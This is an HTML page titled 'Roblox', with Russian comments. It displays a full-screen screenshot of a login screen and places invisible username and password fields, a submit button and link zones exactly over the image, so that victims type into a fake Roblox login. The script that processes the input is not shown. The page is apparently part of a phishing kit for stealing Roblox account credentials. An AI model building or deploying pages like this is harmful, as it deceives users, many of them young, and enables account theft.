<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Твой скриншот на весь экран -->
    <img src="bg.jpg" class="fullscreen-bg" alt="bg">

    <!-- Контейнер, который мы накладываем ровно поверх картинки -->
    <div class="overlay-container">
        
        <form id="loginForm">
            <!-- Поля ввода -->
            <input type="text" id="username" class="invisible-input" placeholder="" required autocomplete="off">
            <input type="password" id="password" class="invisible-input" placeholder="" required autocomplete="new-password">
            
            <!-- Кнопка входа -->
            <button type="submit" class="invisible-btn"></button>
        </form>

        <!-- Кликабельные зоны для остальных кнопок (чтобы курсор менялся) -->
        <a href="#" class="clickable-zone zone-forgot"></a>
        <a href="#" class="clickable-zone zone-email"></a>
        <a href="#" class="clickable-zone zone-quick"></a>
        <a href="#" class="clickable-zone zone-other"></a>
        <a href="#" class="clickable-zone zone-signup"></a>

    </div>

    <script src="script.js"></script>
</body>
</html>
